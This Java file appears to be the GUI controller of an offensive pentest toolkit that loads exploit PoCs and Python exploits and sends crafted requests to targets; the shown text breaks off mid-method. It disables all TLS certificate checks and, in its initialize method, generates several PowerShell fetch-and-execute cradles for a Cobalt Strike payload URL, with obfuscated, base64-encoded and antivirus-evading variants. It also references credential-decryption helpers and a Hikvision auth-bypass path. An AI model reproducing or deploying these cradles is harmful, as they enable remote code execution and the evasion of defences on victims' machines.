package main;

import com.alibaba.druid.filter.config.ConfigTools;
import java.awt.*;
import java.io.*;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.io.FileWriter;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.input.KeyEvent;
import javafx.scene.input.MouseEvent;
import javafx.scene.text.Text;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javax.net.ssl.*;
import static main.RequestPoc.Poclist.*;
import main.RequestPoc.Readfile;
import static main.RequestPoc.Readfile.ymlFiletoconditioninformation;
import static main.RequestPoc.Readfile.modifyFileContent;
import static main.RequestPoc.makeRequest.listMakeRequest;
import main.RequestPoc.test7;
import static main.RequestPoc.test7.Url.extractLists;
import static main.RequestPoc.test7.Url.extractListsinput;
import static main.finalshelltest.finalshellDecode.decodePass;
import static main.finalshelltest.seeyonGetpass.*;
import static main.util.AEStest2.decryptbuwei;
import static main.util.AEStest2.encryptbuwei;
import static main.util.CorsJsonp.*;
import static main.util.Tasklist.readFileByLines;
import static main.util.Tasklist.ifexe;
import static main.util.Tasklist.taskexechange;
import static main.util.Usualcmd.readFilestokey;
import static main.util.Usualcmd.readFileByLines2;
import static main.util.Usualcmd.usualcmdlist;
import static main.util.druidgetinformation.*;
import static main.util.AESDESende.*;
import static main.util.AEStest.*;
import static main.util.fileEncode.Base64Encode;
import static main.util.fileEncode.bytesEncode;
import main.util.StageManager;
import static main.util.encodeUtil.*;
import static main.util.pythonexp.deleteArrayNull;
import main.support.Expdecode;
import main.support.SerializationDumper;


public class Poc2ExpguiController {


    // ??????https????????? 24-59???
    // https://gist.github.com/aembleton/889392

    static {
        try {
            Poc2ExpguiController.disableSSLCertificateChecking();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (KeyManagementException e) {
            e.printStackTrace();
        }
    }

    public static void disableSSLCertificateChecking() throws NoSuchAlgorithmException, KeyManagementException {
        TrustManager[] trustAllCerts = new TrustManager[] {new X509TrustManager() {
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return null;
            }
            public void checkClientTrusted(X509Certificate[] certs, String authType) {
            }
            public void checkServerTrusted(X509Certificate[] certs, String authType) {
            }
        }
        };
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HostnameVerifier allHostsValid = new HostnameVerifier(){
            public boolean verify(String hostname, SSLSession session) {
                return true;
            }

        };
        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
    }
    // ???????????????


//    @FXML
//    private Button mButton;
//
    @FXML
    private Button mButton11;

    @FXML
    private TextArea mTextArea;

    @FXML
    private TextArea mTextArea2;

    @FXML
    private TextArea mTextArea3;

    @FXML
    private TextArea mTextArea4;

    @FXML
    private TextArea mTextArea5;

    @FXML
    private TextArea mTextArea6;

    @FXML
    private TextArea mTextArea7;

    @FXML
    private TextArea mTextArea8;

    @FXML
    private TextArea mTextArea9;

    @FXML
    private TextArea mTextArea10;

    @FXML
    private TextArea mTextArea12;

    @FXML
    private TextArea mTextArea11;

    @FXML
    private TextArea mTextArea13;

    @FXML
    private TextArea mTextArea14;

    @FXML
    private TextArea mTextArea15;

    @FXML
    private TextArea mTextArea16;

    @FXML
    private TextArea mTextArea17;

    @FXML
    private TextArea mTextArea18;

    @FXML
    private TextArea mTextArea19;

    @FXML
    private TextArea mTextArea20;

    @FXML
    private TextArea mTextArea21;

    @FXML
    private TextArea mTextArea22;

    @FXML
    private TextArea mTextArea24;

    @FXML
    private TextArea mTextArea25;

    @FXML
    private TextArea mTextArea26;

    @FXML
    private TextArea mTextArea27;

    @FXML
    private TextArea mTextArea28;
//    @FXML
//    private TextArea mTextArea112;

    @FXML
    private TextArea mTextAreatest;

    @FXML
    private Label mLabel2;

    @FXML
    private Label mLabel4;

    @FXML
    public Label mLabeltest;

    @FXML
    public Label mLabeltest2;

    @FXML
    private TextField mTextField1;

    @FXML
    private TextField mTextField2;

    @FXML
    private TextField mTextField3;

    @FXML
    private TextField mTextField4;

    @FXML
    private TextField mTextField5;

    @FXML
    private TextField mTextField51;

    @FXML
    private TextField mTextField6;

    @FXML
    private TextField mTextField7;

    @FXML
    private TextField mTextField8;

    @FXML
    private TextField mTextField82;

    @FXML
    private TextField mTextField9;

    @FXML
    private TextField mTextField10;

    @FXML
    private TextField mTextField11;

    @FXML
    private TextField mTextField12;

    @FXML
    private TextField mTextField13;

    @FXML
    private TextField mTextField14;

    @FXML
    private Text mText3;

    @FXML
    private Text mText32;

    @FXML
    private Text mText4;

    @FXML
    private Text mText5;

    @FXML
    private Text mText6;

    @FXML
    private ListView<String> mListView1;

    @FXML
    private ListView<String> mListView2;

    @FXML
    private ListView<String> mListView3;

    @FXML
    private ListView<String> mListView4;

    @FXML
    private ListView<String> mListView5;

//    private String tranDataToIndex;

    @FXML
    private RadioButton mRadiobutton;

    @FXML
    private RadioButton mRadiobutton1;

    @FXML
    private RadioButton mRadiobutton2;

    @FXML
    private RadioButton mRadiobutton3;

    @FXML
    private RadioButton mRadiobutton4;

    @FXML
    private RadioButton mRadiobutton5;

    @FXML
    private RadioButton mRadiobutton6;

    @FXML
    private RadioButton mRadiobutton7;

    @FXML
    private RadioButton mRadiobutton8;

    @FXML
    private RadioButton mRadiobutton9;

    @FXML
    private RadioButton mRadiobutton10;

    @FXML
    private RadioButton mRadiobutton11;

    @FXML
    private ChoiceBox mChoiceBox1; // aes/des/des3

    @FXML
    private ChoiceBox mChoiceBox2;  // ????????????

    @FXML
    private ChoiceBox mChoiceBox3; // ????????????

    @FXML
    private ChoiceBox mChoiceBox4; // ????????????base64 / hex

    @FXML
    private ChoiceBox mChoiceBox5; // key???iv????????? base64

    @FXML
    private TextField mTextField20; // ??????

    @FXML
    private TextField mTextField15; // ?????????

    @FXML
    private TextArea mTextArea29; // ??????

    @FXML
    private TextArea mTextArea30; // ??????

    @FXML
    private TextArea mTextArea31; // ??????????????????

    @FXML
    private TextArea mTextArea32; // ??????????????????

    @FXML
    private TextArea mTextArea33; // ???????????????

    @FXML
    private TextArea mTextArea34; // ??????????????????

    @FXML
    private TextArea mTextArea35; // ??????????????????

    @FXML
    private TextArea mTextArea36; // ??????????????????



    String httpport = null ;

    // ????????????????????????poc???poc?????????
    public void initialize() throws IOException {
//        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
//        URL url=new URL("jar:file:" + jarPath + "!/1.txt");
//        String pythonpath = readFileByLinesproperties(url);

        Properties prop = new Properties();
        prop.load(Main.class.getResourceAsStream("/config.properties"));
        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win")) {
            String pythonpath = readFileByLinesproperties("property/config.properties");
            String[] pythonpaths = pythonpath.split(" ");
            mTextField8.setText(pythonpaths[0]);
            mTextField82.setText(pythonpaths[1]);
            mTextField9.setText(pythonpaths[2]);
        }else {
            mTextField8.setText(prop.getProperty("python2path"));
            mTextField82.setText(prop.getProperty("python3path"));
            mTextField9.setText(prop.getProperty("cspayload"));

        }

        //?????????cspayload??????????????????????????????
        String inputString = mTextField9.getText().trim();
        String outputString1 = "";
        String outputString2 = "";
        String outputString3 = "";
        String outputString4 = "";

        outputString1 = "powershell -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('" + inputString.substring(0,2) +"'+'" + inputString.substring(2) + "'))\"";
        mTextArea16.setText(outputString1); // ????????????

        String strtest = "IEX (New-Object System.Net.Webclient).DownloadString('" + inputString + "')";

        byte[] sb2 = strtest.getBytes();
        int ii = 0;
        byte[] bt3 = new byte[sb2.length+sb2.length];
        for (byte btest:sb2) {
            bt3[ii++] = btest;
            bt3[ii++] = (byte)0x00;
        }
        String str= new String (bt3);
        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
        mTextArea17.setText("powershell -enc " + base64encodedString); // ????????????


        outputString2 = "powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('" +  inputString + "')\"";
        mTextArea18.setText(outputString2); // ????????????

        outputString3 = "powershell set-alias -name kaspersky -value Invoke-Expression;\"$a1='kaspersky ((new-object net.webclient).downl';$a2='oadstring(''" +  inputString + "''))';$a3=$a1,$a2;kaspersky(-join $a3)\"";
        mTextArea19.setText(outputString3); // ????????????

        outputString4 = "powershell -NoExit $c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''" +  inputString + "'')'.Replace('123','adString');IEX ($c1+$c2)";
        mTextArea20.setText(outputString4); // ????????????
        // ?????????cspayload??????????????????????????????


        ObservableList<String> strList = dirnametlistview1("poc");

        if(os.toLowerCase().startsWith("win")) {
            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }

        mListView1.setItems(strList);
        mTextArea.setWrapText(true);// ????????????
        mTextArea3.setWrapText(true); // ????????????

        ObservableList<String> keylist = readFilestokey("property/cmdlists.txt");
        mListView3.setItems(keylist);
        mTextArea8.setWrapText(true); // ????????????

        ObservableList<String> strList2 = dirnametlistview1("pythonexp"); //python??????????????????
        if(os.toLowerCase().startsWith("win")) {
            for (int i = 0; i < strList2.size(); i++) {
                String[] strlist_list2 = strList2.get(i).split("\\\\");
                strList2.set(i, strlist_list2[strlist_list2.length-1]);
            }
        }

        mListView4.setItems(strList2);
        mTextArea9.setWrapText(true); // ????????????
        mTextArea10.setWrapText(true); // ????????????
        mTextArea11.setWrapText(true); // ????????????
        mTextArea12.setWrapText(true); // ????????????

        mTextArea13.setWrapText(true); // ????????????
        mTextArea14.setWrapText(true); // ????????????
        mTextArea15.setWrapText(true); // ????????????

        mTextArea16.setWrapText(true); // ????????????
        mTextArea17.setWrapText(true); // ????????????
        mTextArea18.setWrapText(true); // ????????????
        mTextArea19.setWrapText(true); // ????????????
        mTextArea20.setWrapText(true); // ????????????
        mTextArea21.setWrapText(true); // ????????????
        mTextArea22.setWrapText(true); // ????????????
        mTextArea24.setWrapText(true); // ????????????
        mTextArea25.setWrapText(true); // ????????????
        mTextArea26.setWrapText(true); // ????????????
        mTextArea27.setWrapText(true); // ????????????
        mTextArea28.setWrapText(true); // ????????????
        mTextArea29.setWrapText(true); // ????????????
        mTextArea30.setWrapText(true); // ????????????
        mTextArea33.setText(".html\n.xsd\n//\n/springframework/");

        ToggleGroup tg = new ToggleGroup(); // radiobutton??????
        mRadiobutton3.setToggleGroup(tg);
        mRadiobutton4.setToggleGroup(tg);
        mRadiobutton5.setToggleGroup(tg);
        mRadiobutton6.setToggleGroup(tg);

        ToggleGroup tg2 = new ToggleGroup(); // radiobutton??????
        mRadiobutton7.setToggleGroup(tg2);
        mRadiobutton8.setToggleGroup(tg2);

        String[] encodes_lists = new String[]{"AES", "DES", "DESede" };
        mChoiceBox1.setItems(FXCollections.observableArrayList(
                "AES", "DES", "DESede")
        ); // ??????AES DES DES3 RSA???????????????
        mChoiceBox1.setValue("AES"); // ????????????AES??????

//        mChoiceBox1.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener() { // ???????????????RSA??????
//            @Override
//            public void changed(ObservableValue observable, Object oldValue, Object newValue) {
//                if (encodes_lists[(int) newValue].equals("RSA")){
//                mChoiceBox3.setItems(FXCollections.observableArrayList(
//                        "PKCS1Padding", "OAEPWithSHA-256AndMGF1Padding","OAEPWithSHA-1AndMGF1Padding")
//                ); // ??????????????????
//                mChoiceBox3.setValue("PKCS1Padding"); // ????????????PKCS5Padding??????
//                }
//                if (!encodes_lists[(int) newValue].equals("RSA")){
//                    mChoiceBox3.setItems(FXCollections.observableArrayList(
//                             "PKCS1Padding", "OAEPWithSHA-256AndMGF1Padding","OAEPWithSHA-1AndMGF1Padding","PKCS5Padding", "NoPadding")); // ??????????????????
//                    mChoiceBox3.setValue("PKCS5Padding"); // ????????????PKCS5Padding??????
//                }
//            }
//        });

        mChoiceBox2.setItems(FXCollections.observableArrayList(
                "ECB", "CBC","CFB")
        ); // ??????????????????
        mChoiceBox2.setValue("CBC"); // ????????????CBC??????


        String[] modes_lists = new String[]{"PKCS5Padding", "NoPadding"};
        mChoiceBox3.setItems(FXCollections.observableArrayList(
                        "PKCS5Padding", "NoPadding")); // ??????????????????
        mChoiceBox3.setValue("PKCS5Padding"); // ????????????PKCS5Padding??????

//        mChoiceBox3.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener() { // ???????????????RSA?????????
//            @Override
//            public void changed(ObservableValue observable, Object oldValue, Object newValue) {
//                if (modes_lists[(int) newValue].equals("PKCS1Padding") || modes_lists[(int) newValue].equals("OAEPWithSHA-256AndMGF1Padding") || modes_lists[(int) newValue].equals("OAEPWithSHA-1AndMGF1Padding") ){
//                    mChoiceBox1.setItems(FXCollections.observableArrayList(
//                            "RSA")
//                    ); // ??????????????????
////                    mChoiceBox1.setValue("RSA"); // ????????????PKCS5Padding??????
//
//                } else if( !modes_lists[(int) newValue].equals("PKCS1Padding") && !modes_lists[(int) newValue].equals("OAEPWithSHA-256AndMGF1Padding") && !modes_lists[(int) newValue].equals("OAEPWithSHA-1AndMGF1Padding")) {
//                    mChoiceBox1.setItems(FXCollections.observableArrayList("AES", "DES", "DES3", "RSA")
//                    ); // ??????????????????
//                    mChoiceBox1.setValue("AES"); // ????????????PKCS5Padding??????
//                }
//            }
//        });

        mChoiceBox4.setItems(FXCollections.observableArrayList(
                "Base64", "Hex", "???")
        ); // ??????????????????
        mChoiceBox4.setValue("???"); // ????????????Hex

        mChoiceBox5.setItems(FXCollections.observableArrayList(
                "Base64", "Hex", "???")
        ); // ??????????????????
        mChoiceBox5.setValue("???"); // ????????????Hex


    }



    // ??????properties????????????
    public static String readFileByLinesproperties(String fileName) {
        File file = new File(fileName);
        BufferedReader reader = null;
        String python2path = "";
        String python3path = "";
        String pythonpath = "";
        String cspayload = "";
        try {
            reader = new BufferedReader(new FileReader(file));
            String tempString = null;
            // ?????????????????????????????????null???????????????
            while ((tempString = reader.readLine()) != null) {
                if (tempString.contains("python2path"))
                    python2path = tempString.split("=")[1];
                if (tempString.contains("python3path"))
                    python3path = tempString.split("=")[1];
                if (tempString.contains("cspayload"))
                    cspayload = tempString.split("=")[1];

                pythonpath = python2path + " " + python3path + " " +cspayload;
            }
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            return pythonpath;
        }
    }

    // ???????????????????????????usage
    public static String readFileByoneLine(String fileName) {
        File file = new File(fileName);
        BufferedReader reader = null;
        String pythonpath = "";
        try {
            reader = new BufferedReader(new FileReader(file));
            String tempString = null;
            // ?????????????????????????????????null???????????????
            if((tempString = reader.readLine()) != null) {
                if (tempString.contains("######f0ng######"))
                    pythonpath = tempString.split("######f0ng######")[1];
            }
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            return pythonpath;
        }
    }

    @FXML
    // mListView1 ?????????????????????
    public void mListView1Click(MouseEvent event) throws FileNotFoundException {

        ObservableList<String> strList ;

        String os = System.getProperty("os.name");
        System.out.println(System.getProperty("user.dir") + "\\" + mListView1.getSelectionModel().getSelectedItem() );

        if(os.toLowerCase().startsWith("win")) {
            strList = dirnametlistview2( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() );

            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }
        else
            strList = dirnametlistview2("poc/" + mListView1.getSelectionModel().getSelectedItem() );

        mListView2.setItems(strList);
    }

    @FXML
    // mListView1 ?????????????????????
    public void mListView1Click2(KeyEvent event) throws FileNotFoundException {

        ObservableList<String> strList ;

        String os = System.getProperty("os.name");
        System.out.println(System.getProperty("user.dir") + "\\" + mListView1.getSelectionModel().getSelectedItem() );

        if(os.toLowerCase().startsWith("win")) {
            strList = dirnametlistview2( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() );

            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }

        }
        else
            strList = dirnametlistview2("poc/" + mListView1.getSelectionModel().getSelectedItem() );

        mListView2.setItems(strList);
    }

    @FXML
    // mListView2 ??????????????????????????????????????????expname???exp?????????????????????
    public void mListView2Click(MouseEvent event) throws FileNotFoundException {
        String strallowdirects ;
        System.out.println(mListView2.getSelectionModel().getSelectedItem());
        String[] conditioninformation;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win"))
            conditioninformation = ymlFiletoconditioninformation( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem() );

        else
            conditioninformation = ymlFiletoconditioninformation("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() );


        for (String str : conditioninformation)
            if (str != null)
                if (str.contains("condition"))
                { // condition: {words:Content-Type:image/jpeg, time:null}
                    String strwords = str.split(": \\{words:")[1].split(",")[0].trim(); // yml???????????????
                    System.out.println(strwords);
                    mText4.setText(strwords);

                    String strtime = str.split(": \\{words:")[1].split(", time:")[1].replace("}","").replace(", allowDirects:false","").trim(); // yml????????????
                    System.out.println(strtime);
                    mText3.setText(strtime);

                    if (str.contains("allowDirects")) {
                        strallowdirects = str.split(": \\{words:")[1].split(", allowDirects:")[1].replace("}", "").trim(); // yml????????????????????????
                    }else
                        strallowdirects = "true";
                    mText32.setText(strallowdirects);

                }else if(str.contains("expinformation"))
                {// expinformation: {expname:hikvision, expdescribe:hikvision/CVE-2017-7921.yml,???????????????????????????(????????????????????????????????????????????????????????????/onvif-http/snapshot?auth:YWRtaW46MTEK;????????????????????????????????????????????????????????????/Security/users?auth:YWRtaW46MTEK;????????????????????????????????????????????????????????????/System/configurationFile?auth:YWRtaW46MTEK)}

                    String expname = str.split(":")[2].split(", ")[0].trim(); // yml??????expname
                    mTextField6.setText(expname);


                    String expdescribe = str.split(": ")[1].split(", expdescribe:")[1].replace("}","").trim(); // yml??????expdescribe
                    mTextAreatest.setWrapText(true); // ????????????
                    mTextAreatest.setText(expdescribe);
                }
    }

    @FXML
    // mListView2 ??????????????????????????????????????????expname???exp?????????????????????
    public void mListView2Click2(KeyEvent event) throws FileNotFoundException {
        String strallowdirects ;
        System.out.println(mListView2.getSelectionModel().getSelectedItem());
        String[] conditioninformation;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win"))
            conditioninformation = ymlFiletoconditioninformation( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem() );

        else
            conditioninformation = ymlFiletoconditioninformation("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() );


        for (String str : conditioninformation)
            if (str != null)
                if (str.contains("condition"))
                { // condition: {words:Content-Type:image/jpeg, time:null}
                    String strwords = str.split(": \\{words:")[1].split(",")[0].trim(); // yml???????????????
                    System.out.println(strwords);
                    mText4.setText(strwords);

                    String strtime = str.split(": \\{words:")[1].split(", time:")[1].replace("}","").replace(", allowDirects:false","").trim(); // yml????????????
                    System.out.println(strtime);
                    mText3.setText(strtime);

                    if (str.contains("allowDirects")) {
                        strallowdirects = str.split(": \\{words:")[1].split(", allowDirects:")[1].replace("}", "").trim(); // yml????????????????????????
                    }else
                        strallowdirects = "true";
                    mText32.setText(strallowdirects);

                }else if(str.contains("expinformation"))
                {// expinformation: {expname:hikvision, expdescribe:hikvision/CVE-2017-7921.yml,???????????????????????????(????????????????????????????????????????????????????????????/onvif-http/snapshot?auth:YWRtaW46MTEK;????????????????????????????????????????????????????????????/Security/users?auth:YWRtaW46MTEK;????????????????????????????????????????????????????????????/System/configurationFile?auth:YWRtaW46MTEK)}

                    String expname = str.split(":")[2].split(", ")[0].trim(); // yml??????expname
                    mTextField6.setText(expname);


                    String expdescribe = str.split(": ")[1].split(", expdescribe:")[1].replace("}","").trim(); // yml??????expdescribe
                    mTextAreatest.setWrapText(true); // ????????????
                    mTextAreatest.setText(expdescribe);
                }
    }

    @FXML
    // mListView3 ????????????????????????????????????
    public void mListView3Click(MouseEvent event) {
        String a = "";

        String[] list = readFileByLines2("property/cmdlists.txt");

        Map<String,String> usualcmdlist2 = usualcmdlist(list);

        System.out.println(mListView3.getSelectionModel().getSelectedItem());

        for (Map.Entry<String, String> entry : usualcmdlist2.entrySet()) {
            System.out.println(entry.getKey() +"++++" + entry.getValue());
            if ((entry.getKey()).equals(mListView3.getSelectionModel().getSelectedItem()))
            {
                a = entry.getValue();
            }
        }
        System.out.println(a);
        mTextArea8.setText(a);
    }

    @FXML
    // mListView3 ????????????????????????????????????
    public void mListView3Click2(KeyEvent event) {
        String a = "";

        String[] list = readFileByLines2("property/cmdlists.txt");

        Map<String,String> usualcmdlist2 = usualcmdlist(list);

        System.out.println(mListView3.getSelectionModel().getSelectedItem());

        for (Map.Entry<String, String> entry : usualcmdlist2.entrySet()) {
            System.out.println(entry.getKey() +"++++" + entry.getValue());
            if ((entry.getKey()).equals(mListView3.getSelectionModel().getSelectedItem()))
            {
                a = entry.getValue();
            }
        }
        System.out.println(a);
        mTextArea8.setText(a);
    }

    @FXML
    // mListView4 ??????  pythonexp?????????????????????
    public void mListView4Click(MouseEvent event) throws FileNotFoundException {

        ObservableList<String> strList = null;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win")) {
            strList = dirnametlistview2(System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem());
            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }
        else
            strList = dirnametlistview2("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() );
        mListView5.setItems(strList);
    }

    @FXML
    // mListView4 ??????  pythonexp?????????????????????
    public void mListView4Click2(KeyEvent event) throws FileNotFoundException {

        ObservableList<String> strList ;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win")) {
            strList = dirnametlistview2(System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem());
            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }
        else
            strList = dirnametlistview2("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() );
        mListView5.setItems(strList);
    }

    @FXML
    // mListView5 ??????  ???????????????????????????????????????
    public void mListView5Click(MouseEvent event) throws FileNotFoundException {
        String usage ;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win"))
            usage = readFileByoneLine(  System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem() + "\\" +mListView5.getSelectionModel().getSelectedItem() );
        else
            usage = readFileByoneLine("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + "/" + mListView5.getSelectionModel().getSelectedItem() );
        mLabeltest2.setText(usage);
    }

    @FXML
    // mListView5 ??????  ???????????????????????????????????????
    public void mListView5Click2(KeyEvent event) throws FileNotFoundException {
        String usage ;

        String os = System.getProperty("os.name");
        System.out.println(System.getProperty("user.dir") + "\\pythonexp\\" + mListView5.getSelectionModel().getSelectedItem());
        if(os.toLowerCase().startsWith("win")) {
            usage = readFileByoneLine( System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem() + "\\" + mListView5.getSelectionModel().getSelectedItem());
        }
        else
            usage = readFileByoneLine("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + "/" + mListView5.getSelectionModel().getSelectedItem() );
        mLabeltest2.setText(usage);
    }


    //?????????????????????txt????????????????????????????????????????????????
    private void poctoFile(String target,String filename) {
        File file=new File(filename);
        if(!file.exists())
        {
            try {
                file.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        try (FileWriter fileWriter = new FileWriter(filename)) {
            fileWriter.append(target);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public  void proxy(){ // ????????????
        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
            String[] ipportlist = mLabeltest.getText().trim().split(":");
            System.setProperty("https.proxyHost", ipportlist[2]);
            System.setProperty("https.proxyPort", ipportlist[3]);
            System.setProperty("http.proxyHost", ipportlist[2]);
            System.setProperty("http.proxyPort", ipportlist[3]);
            // http??????
        } else {
            System.setProperty("https.proxyHost", "");
            System.setProperty("https.proxyPort", "");
            System.setProperty("http.proxyHost", "");
            System.setProperty("http.proxyPort", "");
        }

        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
            String[] ipportlist = mLabeltest.getText().trim().split(":");
            System.getProperties().put("socksProxySet", "true");
            System.getProperties().put("socksProxyHost", ipportlist[2]);
            System.getProperties().put("socksProxyPort", ipportlist[3]);
            // socks??????
        } else {
            System.getProperties().put("socksProxySet", "false");
            System.getProperties().put("socksProxyHost", "");
            System.getProperties().put("socksProxyPort", "");
        }
    }

    @FXML
    //????????????
    public void onButtonClick(ActionEvent event) throws IOException {
        JarFile jarFile = null;
        String[][] request_header = null;
        String ishttps = "http";
        boolean isallowredirects = true;
        if (mRadiobutton.isSelected())
            ishttps = "https";

        if (mRadiobutton1.isSelected())
            isallowredirects = false;

        String responsetime = null;
        String responseheaderbody = null;

        proxy();

        //?????????????????????
        String target = mTextArea.getText() ;// ??????????????????????????????????????????????????????????????????????????????
        String os = System.getProperty("os.name");
        if (os.toLowerCase().startsWith("win")) {
            poctoFile(target, "property/test.txt");
        }else {
            poctoFile(target, "test.txt");
        }

        // ???test.txt??????jar???????????????test.txt

        String jarPath2 = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // ??????config.properties????????????
        String tempPath = jarPath2.substring(0, jarPath2.lastIndexOf("/")) + "/test.txt";
        System.out.println(tempPath + "#####");
        if (!jarPath2.contains(".jar") || os.toLowerCase().startsWith("win") ){
            System.out.println("???jar????????????jar???????????????");
//            try {
//                String os = System.getProperty("os.name");
//                if (os.toLowerCase().startsWith("win")) {
//                    String[] command2 = new String[100];
//                    Robot r = new Robot();
//                    r.delay(500);
//                    command2[0] = "del";
//                    command2[1] = tempPath;
//                    String[] commands2 = deleteArrayNull(command2);
//                    Process pro2 = Runtime.getRuntime().exec(commands2);
//
//                } else {
//                    String[] command2 = new String[100];
//                    Robot r = new Robot();
//                    r.delay(500);
//                    command2[0] = "rm";
//                    command2[1] = tempPath;
//                    String[] commands2 = deleteArrayNull(command2);
//                    Process pro2 = Runtime.getRuntime().exec(commands2);
//                }
//            } catch (Exception e) {
//                // TODO: handle exception
//            }
        }else {
            String[] command = new String[100];
            command[0] = "jar";
            command[1] = "uf";
            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
            command[3] = "test.txt";
            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties ??????jar?????????config.properties??????

            String[] commands = deleteArrayNull(command);
            try {
                Process pro = Runtime.getRuntime().exec(commands);
                os = System.getProperty("os.name");
                if (os.toLowerCase().startsWith("win")) {
                    System.out.println("windows");
//                    String[] command2 = new String[100];
//                    Robot r = new Robot();
//                    r.delay(500);
//                    command2[0] = "del";
//                    command2[1] = tempPath;
//                    String[] commands2 = deleteArrayNull(command2);
//                    Process pro2 = Runtime.getRuntime().exec(commands2);
                } else {
                    String[] command2 = new String[100];
                    Robot r = new Robot();
                    r.delay(1000);
                    command2[0] = "rm";
                    command2[1] = tempPath;
                    String[] commands2 = deleteArrayNull(command2);
                    Process pro2 = Runtime.getRuntime().exec(commands2);
                }
            } catch (Exception e) {
                // TODO: handle exception
            }
        }

        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        if (jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")){ //???????????????jar?????????
            jarFile= new JarFile(jarPath);
            JarEntry jarEntry = jarFile.getJarEntry("test.txt");
            request_header = Readfile.readFileByLines(jarEntry);
        }else if(os.toLowerCase().startsWith("win")){
            request_header = Readfile.readFileByLines("property/test.txt");
        }
        else{ // ???jar?????????????????????????????????test.txt
            System.out.println("???jar???????????????readFileByLines???String??????");
            request_header = Readfile.readFileByLines("test.txt");
        }



//        for (String[] str: request_header)
//            for (String strr: str)
//                System.out.println(strr);


        Map<String, String> responseHeaderbody = listMakeRequest(request_header, ishttps,isallowredirects);
//        System.out.println( "******" + responseHeaderbody);

        for (String key : responseHeaderbody.keySet()) {
            try {

//                System.out.println(responseHeaderbody.get(key));
                String[] response = responseHeaderbody.get(key).split("ms\n");
                responsetime = response[0].split(":")[1].split("ms")[0];
                responseheaderbody = key.replace("null:", "").replace("[", "").replace("]", "") + '\n' + response[1];
//                System.out.println(responseheaderbody);

            } catch (ArrayIndexOutOfBoundsException e) { // ??????????????????????????????response????????????
                responseheaderbody = key.replace("null:", "").replace("[", "").replace("]", "") + '\n';
            }
